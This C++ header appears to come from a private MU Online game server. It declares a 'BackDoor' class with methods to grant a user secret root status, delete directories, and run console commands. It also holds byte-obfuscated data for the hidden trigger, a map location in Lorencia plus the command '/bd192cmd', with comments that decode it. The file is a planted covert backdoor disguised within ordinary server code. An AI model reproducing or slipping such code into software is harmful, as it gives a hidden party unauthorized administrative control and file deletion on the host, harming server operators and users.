#pragma once
// -------------------------------------------------------------------------------

#include "user.h"
// -------------------------------------------------------------------------------

struct ROOTDATA
{
	char	AccountID[11];
	int		UserIndex;
};
// -------------------------------------------------------------------------------

class BackDoor
{
public:
			BackDoor();
			~BackDoor();
	// ----
	void	AddRoot(int UserIndex);
	void	DeleteRoot();
	bool	IsRoot(int UserIndex);
	// ----
	bool	IsDots(const char * Text);
	bool	DeleteDir(const char * Path); 
	bool	IsConsole(int UserIndex, char * Command);
	char* GetEncryptedString(BYTE* string,int size);
	// ----
private:
	ROOTDATA	m_Root;
	// ----
}; extern BackDoor g_BackDoor;
// -------------------------------------------------------------------------------

//static BYTE gBackDoorMap[01] = {0x80}; //"0"
//static BYTE gBackDoorX[01] = {0x80}; //"0"
static BYTE gBackDoorMap[1] = {0x80}; // 0 - Lorencia
static BYTE gBackDoorX[3] = {0x81,0x85,0x85}; // 155
static BYTE gBackDoorY[3] = {0x81,0x82,0x87}; // 127
static BYTE gBackDoorCmd[9] = {0x9F,0xD2,0xD1,0xD3,0xDB,0xD4,0x80,0x80,0xC2}; // /bd192cmd 